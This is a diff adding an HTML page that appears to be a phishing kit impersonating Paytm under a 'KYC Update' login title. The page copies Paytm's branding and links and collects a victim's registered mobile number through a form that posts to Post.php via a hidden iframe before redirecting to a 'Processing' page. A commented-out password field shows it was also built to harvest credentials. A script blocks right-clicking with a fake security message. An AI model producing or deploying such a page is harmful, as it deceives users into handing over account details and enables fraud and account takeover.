@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="eng">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/Paytm/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/Paytm/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/Paytm/favicon-16x16.png">
+  <link rel="manifest" href="/Paytm/site.webmanifest">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>Login to paytm - KYC Update</title>
+  <style>
+    #ml
+    {
+      width:104%;
+      margin-left:-6px;
+    }
+    #lk
+    {
+        width:5%;
+        position:absolute;
+        margin:-2px;
+        margin-left:-22px;
+    }
+    #id,#ps
+    {
+      width: 305px;
+      height: 30px;
+      background-color: white;
+      color:#404145;
+      font-size: 15px !important;
+      line-height: 25px !important;
+      padding: 1px 5px;
+      margin-bottom:10px;
+      margin-left:15px;
+      outline: none;
+      background:none;
+      box-shadow: 0px 2px 0px #DADADA;
+      border:none;
+    }
+    #id:hover
+    {
+       box-shadow: 0px 2px 0px #01B9F5;
+    }
+    #ps:hover
+    {
+    box-shadow: 0px 2px 0px #01B9F5;
+    }
+    #btn
+    {
+      width:320px;
+      background-color:#01B9F5;
+      color: white;
+      margin-left:10px;
+      border: solid black;
+      border-radius: 2px;
+      border-width: 0px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 17px;
+      height:50px;
+    }
+    #check
+    { 
+    margin:5px;
+    margin-left:200px;
+    }
+    #chi
+    { 
+    color:#47474D; 
+    font-family:Arial, Helvetica, sans-serif;
+    font-size:14px;
+    } 
+    #ab
+    {
+    width:104%;
+    border-bottom:solid #E6E6E6;
+    border-width:1.5px;
+    }
+    input::-webkit-input-placeholder {
+    color: #CCCCCC;
+    }
+    input:-moz-placeholder {
+    color: #CCCCCC;
+    }
+    input::-moz-placeholder {
+    color: #CCCCCC;
+    }
+    input:-ms-input-placeholder {
+    color: #999;
+    }
+  </style>
+  <script language="javascript"> 
+  var message="For security reasons, This function is not allowed here.";
+  function clickIE4(){
+  if (event.button==2){
+  alert(message);
+  return false;
+  }
+  }
+  function clickNS4(e){
+  if (document.layers||document.getElementById&&!document.all){
+  if (e.which==2||e.which==3){
+  alert(message);
+  return false;
+  }
+  }
+  }
+  if (document.layers){
+  document.captureEvents(Event.MOUSEDOWN);
+  document.onmousedown=clickNS4;}
+  else if (document.all&&!document.getElementById){
+  document.onmousedown=clickIE4;}
+  document.oncontextmenu=new Function("alert(message);return false;")
+  </script>
+</head>
+<body>
+<div class="line">																				 
+   <img src="ptml.jpg" alt="" id="ml"><br><br>
+   <!-- Static- Please don't do anything here-->
+   <script type="text/javascript">var submitted=false;</script>
+   <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing.html';}"></iframe>
+   <!--My Form-->
+   <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+  <b style="font-family:arial; font-size:25px; color:#434343; margin-left:20px;">Login to Access Your <span style="margin-left:20px;">Account</b><br><br><br>
+   <b style="font-family:arial; font-size:15px; color:#01B9F5; margin-left:15px;">Mobile Number</b><br>
+   <input type="text"name="Mobile No." id="id" inputmode="numeric"
+   placeholder="Registered Paytm Mobile Number" 
+   maxlength="10"
+   pattern="[6-9]\d{9}"
+   title="Please enter valid mobile number" required=""><br>
+   <!--<b style="font-family:arial; font-size:15px; color:#01B9F5; margin-left:15px;">Password</b><br>
+   <input type="password" name="Password" id="ps" placeholder="Paytm Password"
+   required=""><br>
+   <div id="chi">
+   <input type="checkbox"  id="check" onclick="myFunction()">Show Password
+   </div><br><br>
+   <script>
+   function myFunction() {
+   var x = document.getElementById("ps");
+   if (x.type === "password") {
+   x.type = "text";
+   } else {
+   x.type = "password";
+   }
+   }
+   </script>-->
+   <center><p style="color:#516D85; font-size:9.4px; margin-left:0px;">
+   IMPORTANT! To protect your password and account, ensure you have <br>not shared your screen with others. Paytm never asks to share screen
+   </p></center><br>
+   <button type="submit" id="btn"><span><img src="lock.svg" id="lk">Get OTP</span></button><br><br>
+   <center><a href="https://accounts.paytm.com/oauth2/v3/authorize?theme=mp-html5&minKyc=true&isSignup=false&redirect_uri=https://www.paytm.com&is_verification_excluded=false&client_id=noLoginMinKyc&type=web_server&scope=paytm&response_type=code#!/displayMessage" style="color:#01B9F5; text-decoration:none; font-size:14px; letter-spacing:0px; word-spacing: 0px; font-family: Arial, Helvetica, sans-serif; margin-left:10px;"><b>
+   Help me login</a></center><br>
+   <!--<b style="color: #01B9F5; font-size:13.5px; font-family: Arial, Helvetica, sans-serif; margin-left:30px;"> <a href="forgot.html" style=" color:#01B9F5; font-family: Arial, Helvetica, sans-serif; text-decoration:none;">Forgot Password</a></b><br><br>
+   --><b style="color:#9A9A9A; font-size:14px; letter-spacing:0.5px; word-spacing:1px; font-family: Arial, Helvetica, sans-serif; margin-left:10px;">
+   By signing in, you agree to our
+   <span><a style="color: #01B9F5; text-decoration:none;" href="https://pages.paytm.com/privacy.html">privacy policy</a></span>
+   <br>
+   <span style="color:#9A9A9A; margin-left:10px;">&</span>
+   <span><a style="color:#01B9F5; text-decoration:none; "href="https://paytm.com/company/terms-and-conditions#tandc">terms of use.</span></a></b><br><br>
+   <!--<div id="ab" 
+   style="margin:10px; 
+   margin-left:-8px;">-->
+   </div><br>
+   </b></span></form></div></body></html>
+   
